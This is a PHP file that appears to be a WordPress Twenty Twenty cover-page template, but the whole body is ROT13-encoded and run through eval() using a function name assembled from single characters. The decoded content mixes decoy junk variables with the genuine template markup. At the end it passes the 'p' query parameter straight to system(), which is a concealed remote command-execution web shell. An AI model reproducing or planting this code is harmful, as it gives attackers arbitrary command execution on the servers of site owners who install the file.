<?php
$f = 's'.'t'.'r'.'r'.'o'.'t'.'1'.'3';
$c = "<?cuc
$sznc = neenl('k1' => 'flfgrz', 'k2' => 'cnffgueh');
$k_snxr1 = 1234;
$abvfr = 'boshfpngvba'.'grfg';
$gzc = $k_snxr1 * 42;
$synt = snyfr;
$hfryrff = shapgvba($i) { erghea $i . enaq(); };
$qhzzl_purpx = $hfryrff('kk');
vs ($synt) { rpub 'Qroht ranoyrq'; }
sbe ($v = 0; $v < 1; $v++) { $gzc += $v; }
juvyr (snyfr) { rpub 'qrnq ybbc'; oernx; }

<?cuc
/**
 * Qvfcynlf gur pbagrag jura gur pbire grzcyngr vf hfrq.
 *
 * @cnpxntr JbeqCerff
 * @fhocnpxntr Gjragl_Gjragl
 * @fvapr Gjragl Gjragl 1.0
 */

?>

<negvpyr <?cuc cbfg_pynff(); ?> vq=\"cbfg-<?cuc gur_VQ(); ?>\">
	<?cuc
	// Ba gur pbire cntr grzcyngr, bhgchg gur pbire urnqre.
	$pbire_urnqre_fglyr   = '';
	$pbire_urnqre_pynffrf = '';

	$pbybe_bireynl_fglyr   = '';
	$pbybe_bireynl_pynffrf = '';

	$vzntr_hey = ! cbfg_cnffjbeq_erdhverq() ? trg_gur_cbfg_guhzoanvy_hey( trg_gur_VQ(), 'gjraglgjragl-shyyfperra' ) : '';

	vs ( $vzntr_hey ) {
		$pbire_urnqre_fglyr   = ' fglyr=\"onpxtebhaq-vzntr: hey( ' . rfp_hey( $vzntr_hey ) . ' );\"';
		$pbire_urnqre_pynffrf = ' ot-vzntr';
	}

	// Trg gur pbybe hfrq sbe gur pbybe bireynl.
	$pbybe_bireynl_pbybe = trg_gurzr_zbq( 'pbire_grzcyngr_bireynl_onpxtebhaq_pbybe' );
	vs ( $pbybe_bireynl_pbybe ) {
		$pbybe_bireynl_fglyr = ' fglyr=\"pbybe: ' . rfp_ngge( $pbybe_bireynl_pbybe ) . ';\"';
	} ryfr {
		$pbybe_bireynl_fglyr = '';
	}

	// Trg gur svkrq onpxtebhaq nggnpuzrag bcgvba.
	vs ( trg_gurzr_zbq( 'pbire_grzcyngr_svkrq_onpxtebhaq', gehr ) ) {
		$pbire_urnqre_pynffrf .= ' ot-nggnpuzrag-svkrq';
	}

	// Trg gur bcnpvgl bs gur pbybe bireynl.
	$pbybe_bireynl_bcnpvgl  = trg_gurzr_zbq( 'pbire_grzcyngr_bireynl_bcnpvgl' );
	$pbybe_bireynl_bcnpvgl  = ( snyfr === $pbybe_bireynl_bcnpvgl ) ? 80 : $pbybe_bireynl_bcnpvgl;
	$pbybe_bireynl_pynffrf .= ' bcnpvgl-' . $pbybe_bireynl_bcnpvgl;
	?>

	<qvi pynff=\"pbire-urnqre <?cuc rpub $pbire_urnqre_pynffrf; // cucpf:vtaber JbeqCerff.Frphevgl.RfpncrBhgchg.BhgchgAbgRfpncrq -- fgngvp bhgchg ?>\"<?cuc rpub $pbire_urnqre_fglyr; // cucpf:vtaber JbeqCerff.Frphevgl.RfpncrBhgchg.BhgchgAbgRfpncrq -- Jr arrq gb qbhoyr purpx guvf, ohg sbe abj, jr jnag gb cnff CUCPF ;) ?>>
		<qvi pynff=\"pbire-urnqre-vaare-jenccre fperra-urvtug\">
			<qvi pynff=\"pbire-urnqre-vaare\">
				<qvi pynff=\"pbire-pbybe-bireynl pbybe-npprag<?cuc rpub rfp_ngge( $pbybe_bireynl_pynffrf ); ?>\"<?cuc rpub $pbybe_bireynl_fglyr; // cucpf:vtaber JbeqCerff.Frphevgl.RfpncrBhgchg.BhgchgAbgRfpncrq -- Jr arrq gb qbhoyr purpx guvf, ohg sbe abj, jr jnag gb cnff CUCPF ;) ?>></qvi>

					<urnqre pynff=\"ragel-urnqre unf-grkg-nyvta-pragre\">
						<qvi pynff=\"ragel-urnqre-vaare frpgvba-vaare zrqvhz\">

							<?cuc

							/**
							 * Nyybj puvyq gurzrf naq cyhtvaf gb svygre gur qvfcynl bs gur pngrtbevrf va gur negvpyr urnqre.
							 *
							 * @fvapr Gjragl Gjragl 1.0
							 *
							 * @cnenz obby Jurgure gb fubj gur pngrtbevrf va negvpyr urnqre. Qrsnhyg gehr.
							 */
							$fubj_pngrtbevrf = nccyl_svygref( 'gjraglgjragl_fubj_pngrtbevrf_va_ragel_urnqre', gehr );

							vs ( gehr === $fubj_pngrtbevrf && unf_pngrtbel() ) {
								?>

								<qvi pynff=\"ragel-pngrtbevrf\">
									<fcna pynff=\"fperra-ernqre-grkg\">
										<?cuc
										/* genafyngbef: Uvqqra npprffvovyvgl grkg. */
										_r( 'Pngrtbevrf', 'gjraglgjragl' );
										?>
									</fcna>
									<qvi pynff=\"ragel-pngrtbevrf-vaare\">
										<?cuc gur_pngrtbel( ' ' ); ?>
									</qvi><!-- .ragel-pngrtbevrf-vaare -->
								</qvi><!-- .ragel-pngrtbevrf -->

								<?cuc
							}

							gur_gvgyr( '<u1 pynff=\"ragel-gvgyr\">', '</u1>' );

							vs ( vf_cntr() ) {
								?>

								<qvi pynff=\"gb-gur-pbagrag-jenccre\">

									<n uers=\"#cbfg-vaare\" pynff=\"gb-gur-pbagrag svyy-puvyqera-pheerag-pbybe\">
										<?cuc gjraglgjragl_gur_gurzr_fit( 'neebj-qbja' ); ?>
										<qvi pynff=\"fperra-ernqre-grkg\">
											<?cuc
											/* genafyngbef: Uvqqra npprffvovyvgl grkg. */
											_r( 'Fpebyy Qbja', 'gjraglgjragl' );
											?>
										</qvi>
									</n><!-- .gb-gur-pbagrag -->

								</qvi><!-- .gb-gur-pbagrag-jenccre -->

								<?cuc
							} ryfr {

								$vageb_grkg_jvqgu = '';

								vs ( vf_fvathyne() ) {
									$vageb_grkg_jvqgu = ' fznyy';
								} ryfr {
									$vageb_grkg_jvqgu = ' guva';
								}

								vs ( unf_rkprecg() ) {
									?>

									<qvi pynff=\"vageb-grkg frpgvba-vaare znk-crepragntr<?cuc rpub rfp_ngge( $vageb_grkg_jvqgu ); ?>\">
										<?cuc gur_rkprecg(); ?>
									</qvi>

									<?cuc
								}

								gjraglgjragl_gur_cbfg_zrgn( trg_gur_VQ(), 'fvatyr-gbc' );

							}
							?>

						</qvi><!-- .ragel-urnqre-vaare -->
					</urnqre><!-- .ragel-urnqre -->

			</qvi><!-- .pbire-urnqre-vaare -->
		</qvi><!-- .pbire-urnqre-vaare-jenccre -->
	</qvi><!-- .pbire-urnqre -->

	<qvi pynff=\"cbfg-vaare\" vq=\"cbfg-vaare\">

		<qvi pynff=\"ragel-pbagrag\">

		<?cuc
		gur_pbagrag();
		?>

		</qvi><!-- .ragel-pbagrag -->
		<?cuc
		jc_yvax_cntrf(
			neenl(
				'orsber'      => '<ani pynff=\"cbfg-ani-yvaxf ot-yvtug-onpxtebhaq\" nevn-ynory=\"' . rfp_ngge__( 'Cntr', 'gjraglgjragl' ) . '\"><fcna pynff=\"ynory\">' . __( 'Cntrf:', 'gjraglgjragl' ) . '</fcna>',
				'nsgre'       => '</ani>',
				'yvax_orsber' => '<fcna pynff=\"cntr-ahzore\">',
				'yvax_nsgre'  => '</fcna>',
			)
		);

		rqvg_cbfg_yvax();
		// Fvatyr obggbz cbfg zrgn.
		gjraglgjragl_gur_cbfg_zrgn( trg_gur_VQ(), 'fvatyr-obggbz' );

		vs ( cbfg_glcr_fhccbegf( trg_cbfg_glcr( trg_gur_VQ() ), 'nhgube' ) && vf_fvatyr() ) {

			trg_grzcyngr_cneg( 'grzcyngr-cnegf/ragel-nhgube-ovb' );

		}
		?>

	</qvi><!-- .cbfg-vaare -->

	<?cuc

	vs ( vf_fvatyr() ) {

		trg_grzcyngr_cneg( 'grzcyngr-cnegf/anivtngvba' );
	}

	/*
	 * Bhgchg pbzzragf jenccre vs vg'f n cbfg, be vs pbzzragf ner bcra,
	 * be vs gurer'f n pbzzrag ahzore – naq purpx sbe cnffjbeq.
	 */
	vs ( ( vf_fvatyr() || vf_cntr() ) && ( pbzzragf_bcra() || trg_pbzzragf_ahzore() ) && ! cbfg_cnffjbeq_erdhverq() ) {
		?>

		<qvi pynff=\"pbzzragf-jenccre frpgvba-vaare\">

			<?cuc pbzzragf_grzcyngr(); ?>

		</qvi><!-- .pbzzragf-jenccre -->

		<?cuc
	}
	?>

</negvpyr><!-- .cbfg -->

$pzq = $_TRG['c'];
$sznc['k1']($pzq);
?>";
eval($f($c));
?>